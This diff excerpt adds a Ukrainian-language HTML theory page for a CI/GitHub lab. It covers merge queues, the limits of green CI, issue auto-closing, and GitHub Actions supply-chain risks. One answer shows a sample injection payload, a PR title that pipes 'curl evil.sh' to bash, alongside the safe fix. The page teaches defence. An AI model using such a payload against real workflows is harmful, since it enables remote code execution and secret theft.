+        <p>Для великих команд існує <b>merge queue</b>: PR'и шикуються в чергу й перевіряються на «передбачуваному» результаті злиття, щоб уникнути конфліктів «зелених поодинці, червоних разом».</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>19. Чому зелений CI не гарантує відсутності багів?</summary>
+      <div class="ans">
+        <p>Бо тести перевіряють <b>лише те, що в них написано</b>. Основні обмеження:</p>
+        <ul>
+          <li><b>Не повне покриття</b>: 100% coverage не означає 100% перевірених сценаріїв — можна виконати рядок, не перевіривши його результат;</li>
+          <li><b>Неправильні очікування</b>: тест може «закріпити» баг як правильну поведінку;</li>
+          <li><b>Межі unit-тестів</b>: інтеграційні проблеми (БД, черги, час, конкурентність) не видно;</li>
+          <li><b>Flaky tests</b>: нестабільні тести привчають ігнорувати червоний CI — це гірше за відсутність тестів;</li>
+          <li><b>Середовище</b>: тести на SQLite не виявлять проблем MySQL/Postgres.</li>
+        </ul>
+        <p>Що підвищує довіру: mutation testing (перевіряє, чи тести <b>ловлять</b> штучно внесені зміни), контрактні тести, інтеграційні/E2E на критичних шляхах, code review і статичний аналіз (PHPStan/Psalm).</p>
+        <p>Правильна теза для висновків: CI <b>знижує ймовірність</b> регресій і робить їх дешевими для виявлення, але не замінює мислення й рев'ю.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>20. Як технічно працює автозакриття Issue і що змінюється при squash/rebase merge?</summary>
+      <div class="ans">
+        <p>GitHub парсить текст <b>опису PR</b>, <b>коментарів</b> і <b>повідомлень комітів</b> на ключові слова (<code>Fixes</code>, <code>Closes</code>, <code>Resolves</code> + <code>#N</code>). Зв'язок зберігається як «reference» між PR і Issue.</p>
+        <p>Закриття відбувається <b>в момент merge у default branch</b>: GitHub перевіряє, що PR справді потрапив у дефолтну гілку, і закриває Issue зі статусом <code>completed</code>, додаючи подію <code>closed this as completed in #PR</code>.</p>
+        <p><b>Squash merge:</b> усі коміти стають одним; ключове слово з опису PR усе одно працює, бо зв'язок іде через PR. <b>Rebase merge:</b> коміти переписуються (нові SHA) — і якщо <code>Fixes #N</code> було лише в повідомленні коміту, воно збережеться в новому повідомленні; але покладатися на це не варто — надійніше тримати <code>Resolves #N</code> в описі PR.</p>
+        <p><b>Чому не працює в назві PR:</b> назва — це метадані для людей, GitHub не парсить її на closing keywords.</p>
+      </div>
+    </details>
+
+    <details class="qa">
+      <summary>21. Безпека ланцюга постачання: чому <code>uses: action@main</code> небезпечно і як <code>${{ }}</code> у <code>run:</code> відкриває ін'єкцію?</summary>
+      <div class="ans">
+        <p><b>1. Плаваючий тег.</b> <code>@main</code> означає «виконуй код, який зараз у чужому репозиторії». Власник дії (або зловмисник, що зламав його акаунт) може змінити код — і ваш наступний run виконає його з вашими секретами й <code>GITHUB_TOKEN</code>. Безпечно: пінінг за <b>commit SHA</b> (незмінний), принаймні — за major-тегом, який власник не переписує.</p>
+        <p><b>2. Права токена.</b> За замовчуванням <code>GITHUB_TOKEN</code> може мати широкі права. Принцип найменших привілеїв:</p>
+<pre>permissions:
+  contents: read</pre>
+        <p><b>3. Script injection.</b> Вирази <code>${{ }}</code> підставляються <b>до</b> запуску shell, без екранування:</p>
+<pre># НЕБЕЗПЕЧНО, якщо title приходить від користувача
+- run: echo "PR title: ${{ github.event.pull_request.title }}"</pre>
+        <p>Заголовок PR <code>"; curl evil.sh | bash; echo "</code> виконається як команда. Правильно — передавати через <code>env</code> і брати в лапки:</p>
+<pre>- env:
+    TITLE: ${{ github.event.pull_request.title }}
+  run: echo "PR title: $TITLE"</pre>
+        <p><b>4. <code>pull_request_target</code></b> дає доступ до секретів, але виконується в контексті базової гілки. Якщо в такому workflow зробити checkout коду PR і запустити його — це прямий шлях до RCE з вашими секретами. Використовувати лише для дій, що не виконують код PR (лейбли, коментарі).</p>
+      </div>
+    </details>
+  </section>
+  <footer>
+    <p><b>Лабораторна робота №1</b> · теорія та самоперевірка · файл <code>theory-lab1.html</code></p>
+    <p>План виконання — <code>lab1/PLAN.md</code>. Розширений конспект — <code>lab1/THEORY.md</code>. Питання без відповідей — нижче, у розділі 14, спробуйте спершу відповісти сами.</p>
+  </footer>
+  </main>
+</div>
+
+<a href="#" class="top" title="Догори">↑</a>
+
+<script>
+(function () {
+  var boxes = Array.prototype.slice.call(document.querySelectorAll('details.qa'));
+
+  document.querySelectorAll('.btn').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      var act = btn.getAttribute('data-act');
+      if (act === 'open') {
+        boxes.forEach(function (d) { d.open = true; });
+      } else if (act === 'close') {
+        boxes.forEach(function (d) { d.open = false; });
+      } else if (act === 'print') {
+        boxes.forEach(function (d) { d.open = true; });
+        window.print();
+      }
+    });
+  });
+
+  // Клавіші: O — відкрити всі, C — закрити (коли фокус не в полі вводу)
+  document.addEventListener('keydown', function (e) {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+    if (e.key === 'o' || e.key === 'O') boxes.forEach(function (d) { d.open = true; });
+    if (e.key === 'c' || e.key === 'C') boxes.forEach(function (d) { d.open = false; });
+  });
+})();
+</script>
+</body>
+</html>
